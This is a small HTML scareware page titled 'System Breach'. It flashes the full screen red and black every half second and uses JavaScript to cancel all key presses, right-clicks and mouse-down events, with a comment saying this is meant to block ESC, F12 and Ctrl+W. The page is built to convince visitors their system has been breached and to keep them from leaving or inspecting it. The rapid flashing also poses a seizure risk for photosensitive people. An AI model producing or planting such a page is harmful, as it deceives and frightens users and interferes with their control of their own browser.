<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>System Breach</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background-color: red;
      width: 100%;
      height: 100%;
      overflow: hidden;
      animation: blink 0.5s infinite alternate;
    }

    @keyframes blink {
      0% { background-color: red; }
      100% { background-color: black; }
    }

    /* Hide scrollbars */
    ::-webkit-scrollbar {
      display: none;
    }
  </style>
  <script>
    // Block ESC, F12, Ctrl+W etc.
    document.addEventListener("keydown", function(e) {
      e.preventDefault();
      return false;
    });

    document.addEventListener("contextmenu", function(e) {
      e.preventDefault();
      return false;
    });

    document.addEventListener("mousedown", function(e) {
      e.preventDefault();
      return false;
    });
  </script>
</head>
<body>
</body>
</html>
